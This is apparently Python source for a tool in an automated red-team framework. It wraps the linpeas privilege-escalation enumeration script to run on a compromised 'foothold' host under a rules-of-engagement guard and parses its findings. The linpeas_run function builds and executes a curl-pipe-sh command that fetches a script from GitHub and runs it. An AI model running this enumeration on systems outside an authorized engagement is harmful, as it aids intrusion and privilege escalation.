"""AutoRed linpeas tool wrapper — Phase 4, Task 3.

``linpeas`` is the canonical Linux privilege-escalation enumeration script
from the PEASS-ng suite. It prints a long, ANSI-coloured report covering
SUID binaries, sudo entries, cron jobs, CVEs, interesting files, etc.

Per the T3 brief, this wrapper does NOT actually execute linpeas in Phase 4.
It constructs the curl-pipe-sh command string that would be run via the
foothold's shell session, persists it via ``_save_raw`` so the Phase 6
FootholdSessionManager can replay it, and returns an empty
``LinpeasResult``. The ``_parse_linpeas_output`` helper is exported so a
Phase 6 caller can pass real linpeas stdout back through the same parser
that the unit tests exercise on the fixture file.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression test in
``test_linpeas_ainvoke_works_with_roe_guard``.

Spec ref: §3.4 (post-ex models), §6.8 (RoE guard), §9.2 (RoE categories).
"""
from __future__ import annotations

import re

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.foothold_session import get_installed
from autored.logging import get_logger
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw  # reuse from nmap

log = get_logger("tools.linpeas")


class LinpeasResult(BaseModel):
    """Parsed findings from a linpeas run.

    Phase 4 callers receive this with all list fields empty — real execution
    is deferred to Phase 6. Phase 6 callers receive this populated via
    ``_parse_linpeas_output(real_stdout, host_ip)`` when the
    ``FootholdSessionManager`` is installed (otherwise the wrapper falls
    through to evidence-string mode and returns this with ``command`` set
    but parse lists empty so a human can replay the saved command).
    """

    host_ip: str
    suid_binaries: list[str] = Field(default_factory=list)
    cves: list[str] = Field(default_factory=list)
    cron_jobs: list[str] = Field(default_factory=list)
    sudo_entries: list[str] = Field(default_factory=list)
    interesting_files: list[str] = Field(default_factory=list)
    raw_output_path: str = ""
    command: str = ""
    duration_sec: float = 0.0


# CVE pattern: "CVE-YYYY-NNNN{N,N,N}" — year is exactly 4 digits, the serial
# portion is 4-7 digits per the official MITRE spec.
_CVE_PATTERN = re.compile(r"CVE-\d{4}-\d{4,7}")


def _parse_linpeas_output(text: str, host_ip: str) -> LinpeasResult:
    """Parse linpeas stdout into a ``LinpeasResult``.

    Linpeas output is a long ANSI-coloured report organised into sections
    delimited by ``╚═══...═╣ Section Name`` header lines. The four sections
    the Phase 4 brief cares about — Sudo, SUID, CVEs, Cron jobs — are
    extracted by anchored regex + a non-greedy DOTALL capture that stops
    at the next ``╚`` section header. The CVE extraction is a global
    ``findall`` (no section anchoring) because linpeas scatters CVE refs
    throughout the report, not just in the "CVEs" section.

    Empty input must not crash — returns a result with all list fields empty
    so calling tools can short-circuit safely.
    """
    result = LinpeasResult(host_ip=host_ip)

    # CVEs — global findall, deduped via set() (linpeas repeats popular CVEs).
    result.cves = sorted(set(_CVE_PATTERN.findall(text)))

    # Cron jobs section: header "Cron jobs" then one job per line until the
    # next ╚ section header or end of text.
    cron_section = re.search(
        r"Cron jobs\n(.+?)(?=\n╚|$)", text, re.DOTALL
    )
    if cron_section:
        result.cron_jobs = [
            line.strip()
            for line in cron_section.group(1).splitlines()
            if line.strip() and not line.startswith("╚")
        ]

    # SUID section: header "SUID ... methods for file" then the binary paths
    # (one per line, filter to lines containing "/" — drops noise like the
    # closing ╚ box border that linpeas prints inside the section).
    suid_section = re.search(
        r"SUID.*?methods for file\n(.+?)(?=\n╚|$)", text, re.DOTALL
    )
    if suid_section:
        result.suid_binaries = [
            line.strip()
            for line in suid_section.group(1).splitlines()
            if line.strip() and "/" in line
        ]

    # Sudo section: header "Sudo" then the sudo failure transcript lines.
    sudo_section = re.search(r"Sudo\n(.+?)(?=\n╚|$)", text, re.DOTALL)
    if sudo_section:
        result.sudo_entries = [
            line.strip()
            for line in sudo_section.group(1).splitlines()
            if line.strip()
        ]

    return result


@tool
@roe_guard(allowed_categories=["read_only"])
async def linpeas_run(
    foothold_id: str,
    host_ip: str,
    engagement_id: str = "",
) -> LinpeasResult:
    """Run linpeas on a Linux foothold.

    The command is constructed for execution via the foothold's shell session.
    Actual execution requires the session manager (Phase 6). For now, this tool
    builds the command and saves it to ``engagements/<id>/raw/`` so the Phase 6
    FootholdSessionManager can replay it; the returned ``LinpeasResult`` has
    all parse lists empty because no real linpeas stdout was produced.

    Args:
        foothold_id: ID of the foothold to enumerate.
        host_ip: IP of the foothold host (used by the RoE guard scope check
            and recorded in ``LinpeasResult.host_ip``).
        engagement_id: Current engagement ID for raw output storage + RoE
            registry lookup.

    Returns:
        ``LinpeasResult`` with ``raw_output_path`` set (command was saved)
        and parse lists empty (Phase 4 stub). Phase 6 callers will receive
        a populated result via the foothold shell session.
    """
    log.info("linpeas_start", host_ip=host_ip, foothold_id=foothold_id)

    # curl-pipe-sh fetches the latest linpeas release from the PEASS-ng
    # GitHub releases and pipes it straight into sh — the canonical
    # installation pattern documented in the PEASS-ng README.
    cmd_str = (
        "curl -sL "
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
        "| sh"
    )

    # Phase 6: execute via the foothold session manager when installed.
    # If no manager is installed (or the foothold wasn't found, or the
    # transport failed), fall through to the Phase 4 evidence-string mode
    # so a human can replay the saved command manually.
    session = get_installed()
    if session is not None:
        foothold = session.find_foothold(foothold_id)
        exec_result = None
        if foothold is not None:
            exec_result = await session.execute(foothold, cmd_str)
        if exec_result is not None and exec_result.success:
            raw_path = await _save_raw(
                "linpeas", host_ip, exec_result.stdout, exec_result.stderr,
                engagement_id,
            )
            parsed = _parse_linpeas_output(exec_result.stdout, host_ip)
            parsed.raw_output_path = raw_path
            parsed.command = cmd_str
            parsed.duration_sec = exec_result.duration_sec
            log.info(
                "linpeas_executed",
                host_ip=host_ip, duration=exec_result.duration_sec,
            )
            return parsed
        log.warning(
            "linpeas_execution_unavailable",
            host_ip=host_ip,
            stderr=(exec_result.stderr if exec_result else "foothold not found"),
        )

    # Fallback: evidence-string mode (Phase 4 behavior).
    raw_path = await _save_raw("linpeas_cmd", host_ip, cmd_str, "", engagement_id)
    log.info(
        "linpeas_done",
        host_ip=host_ip,
        foothold_id=foothold_id,
        note="command saved, execution unavailable",
    )
    return LinpeasResult(
        host_ip=host_ip, raw_output_path=raw_path, command=cmd_str,
    )
